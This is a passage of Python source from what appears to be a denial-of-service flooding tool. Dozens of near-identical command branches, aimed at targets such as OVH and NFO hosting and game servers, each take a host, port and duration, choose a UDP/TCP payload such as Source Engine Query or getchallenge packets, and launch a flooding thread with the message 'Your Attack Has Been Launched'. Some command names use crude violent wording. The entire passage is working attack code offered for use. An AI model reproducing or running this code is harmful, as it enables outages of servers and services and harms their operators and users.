					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnatv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnatv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhnatv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError: 
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhamp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfocrush":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "greeth":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "telnet":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovh-killer":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912884
					drop = 912884
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkiller":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912448
					drop = 912448
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhkill":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdown":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdownv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdownv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhdownv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ssdp":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hydrakiller":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nfonull":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "killall":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x00\x02\x00\x2f"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslav":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "cpukill":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslavv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslavv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "ovhslavv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 192198
					drop = 192198
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcprape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforapev1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforapev2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforapev3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "nforape":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\0\x14\0\x01\x03"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "hexraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stdraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "vseraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "synraw":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpkillerv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpkillerv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpkillerv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp-killer":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912488
					drop = 912488
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkiller":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 212344
					drop = 212344
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillerv1":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillerv2":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcpkillerv3":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 16661
					drop = 16661
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp-killer":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 928565
					drop = 924565
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("\033[36mYour Attack Has Been Launched To \033[91mHost [%s] And Port \033[5m[%s] "%(host,port))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpslav":
			try:
				if running >= 1:
					print("\033[36mYou have reached your concurrents limit and must wait for your cooldown period to end.")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 912445
					drop = 912445
					punch = random._urandom(int(pack))
					punch = random._urandom(int(drop))
					payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
